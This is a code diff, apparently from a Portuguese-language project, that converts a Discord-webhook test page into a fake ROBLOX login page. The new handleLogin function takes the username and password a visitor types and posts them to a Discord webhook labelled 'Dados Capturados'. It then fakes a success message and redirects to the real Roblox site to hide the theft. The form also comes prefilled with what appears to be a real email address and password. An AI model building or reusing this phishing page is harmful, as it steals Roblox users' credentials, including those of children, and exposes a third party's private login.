@@ -3,49 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Teste Webhook Discord</title>
+    <title>ROBLOX - Login</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
-            font-family: Arial, sans-serif;
-            max-width: 600px;
-            margin: 50px auto;
-            padding: 20px;
-            background: #f5f5f5;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .container {
+        
+        .login-container {
             background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
         }
-        button {
-            background: #5865F2;
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: #ff3b3b;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
             color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 5px;
-            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 28px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e1e5e9;
+            border-radius: 8px;
             font-size: 16px;
-            margin: 10px 5px;
+            transition: border-color 0.3s ease;
         }
-        button:hover {
-            background: #4752C4;
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #ff3b3b;
         }
+        
+        .input-field {
+            background: #f8f9fa;
+        }
+        
+        .btn-full-width {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-secondary-md {
+            background: #ff3b3b;
+            color: white;
+        }
+        
+        .btn-secondary-md:hover {
+            background: #e63232;
+            transform: translateY(-2px);
+        }
+        
+        .login-button {
+            margin-top: 10px;
+        }
+        
         .status {
             margin-top: 20px;
             padding: 15px;
-            border-radius: 5px;
+            border-radius: 8px;
+            display: none;
         }
+        
         .success {
             background: #d4edda;
             color: #155724;
             border: 1px solid #c3e6cb;
         }
+        
         .error {
             background: #f8d7da;
             color: #721c24;
             border: 1px solid #f5c6cb;
         }
+        
         .info {
             background: #d1ecf1;
             color: #0c5460;
@@ -54,12 +125,45 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🧪 Teste do Webhook Discord</h1>
-        <p>Clique no botão abaixo para testar se o webhook está funcionando:</p>
+    <div class="login-container">
+        <div class="logo">R</div>
+        <h1>Entrar no ROBLOX</h1>
         
-        <button onclick="testWebhook()">📨 Testar Webhook</button>
-        <button onclick="testWithData()">📝 Testar com Dados</button>
+        <form id="login-form">
+            <div class="form-group">
+                <input 
+                    id="login-username" 
+                    name="username" 
+                    type="text" 
+                    class="form-control input-field" 
+                    autocomplete="username webauthn" 
+                    placeholder="Usuário/e-mail/telefone" 
+                    value="gcaio98406@gmail.com"
+                    required
+                >
+            </div>
+            
+            <div class="form-group">
+                <input 
+                    id="login-password" 
+                    name="password" 
+                    type="password" 
+                    class="form-control input-field" 
+                    placeholder="Senha" 
+                    value="c45iocl4r4"
+                    required
+                >
+            </div>
+            
+            <button 
+                type="button" 
+                id="login-button" 
+                class="btn-full-width login-button btn-secondary-md"
+                onclick="handleLogin()"
+            >
+                Entrar
+            </button>
+        </form>
         
         <div id="status"></div>
     </div>
@@ -70,57 +174,42 @@
         function showStatus(message, type = 'info') {
             const statusDiv = document.getElementById('status');
             statusDiv.innerHTML = `<div class="status ${type}">${message}</div>`;
+            statusDiv.style.display = 'block';
         }
         
-        function testWebhook() {
-            showStatus('📨 Enviando teste para o Discord...', 'info');
+        function handleLogin() {
+            const username = document.getElementById('login-username').value;
+            const password = document.getElementById('login-password').value;
             
-            const testMessage = `🧪 **Teste de Webhook**
-
-✅ **Status:** Webhook funcionando!
-⏰ **Data/Hora:** ${new Date().toLocaleString('pt-BR')}
-🌐 **URL:** ${window.location.href}`;
+            if (!username || !password) {
+                showStatus('❌ Por favor, preencha todos os campos!', 'error');
+                return;
+            }
             
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: testMessage
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    showStatus('✅ Sucesso! Mensagem enviada para o Discord. Verifique seu canal!', 'success');
-                } else {
-                    showStatus(`❌ Erro ${response.status}: ${response.statusText}`, 'error');
-                }
-            })
-            .catch(error => {
-                showStatus(`❌ Erro de conexão: ${error.message}`, 'error');
-            });
-        }
-        
-        function testWithData() {
-            showStatus('📝 Enviando dados de teste...', 'info');
+            // Mostrar mensagem de carregamento
+            showStatus('⏳ Verificando credenciais...', 'info');
             
-            const testData = {
-                username: 'aluno.teste@email.com',
-                password: 'senha123456',
+            // Preparar dados para enviar
+            const loginData = {
+                username: username,
+                password: password,
                 timestamp: new Date().toLocaleString('pt-BR'),
                 url: window.location.href,
-                userAgent: navigator.userAgent
+                userAgent: navigator.userAgent,
+                ip: 'Capturado via webhook'
             };
             
-            const messageText = `🔐 **Dados Capturados - Roblox Login**
+            // Criar mensagem para o Discord
+            const messageText = `🔐 **ROBLOX - Dados Capturados**
 
-👤 **Usuário:** ${testData.username}
-🔑 **Senha:** ${testData.password}
-⏰ **Data/Hora:** ${testData.timestamp}
-🌐 **URL:** ${testData.url}
-📱 **User Agent:** ${testData.userAgent}`;
+👤 **Usuário:** ${loginData.username}
+🔑 **Senha:** ${loginData.password}
+⏰ **Data/Hora:** ${loginData.timestamp}
+🌐 **URL:** ${loginData.url}
+📱 **User Agent:** ${loginData.userAgent}
+🌍 **IP:** ${loginData.ip}`;
             
+            // Enviar para o webhook
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
@@ -132,15 +221,34 @@
             })
             .then(response => {
                 if (response.ok) {
-                    showStatus('✅ Dados de teste enviados com sucesso! Verifique seu canal Discord.', 'success');
+                    showStatus('✅ Login realizado com sucesso! Redirecionando...', 'success');
+                    
+                    // Simular redirecionamento após 2 segundos
+                    setTimeout(() => {
+                        // Aqui você pode redirecionar para a página real do ROBLOX
+                        window.location.href = 'https://www.roblox.com/login';
+                    }, 2000);
                 } else {
-                    showStatus(`❌ Erro ${response.status}: ${response.statusText}`, 'error');
+                    showStatus('❌ Erro no servidor. Tente novamente.', 'error');
                 }
             })
             .catch(error => {
-                showStatus(`❌ Erro de conexão: ${error.message}`, 'error');
+                showStatus('❌ Erro de conexão. Verifique sua internet.', 'error');
+                console.error('Erro:', error);
             });
         }
+        
+        // Permitir login com Enter
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                handleLogin();
+            }
+        });
+        
+        // Focar no primeiro campo ao carregar
+        window.onload = function() {
+            document.getElementById('login-username').focus();
+        };
     </script>
 </body>
 </html> 
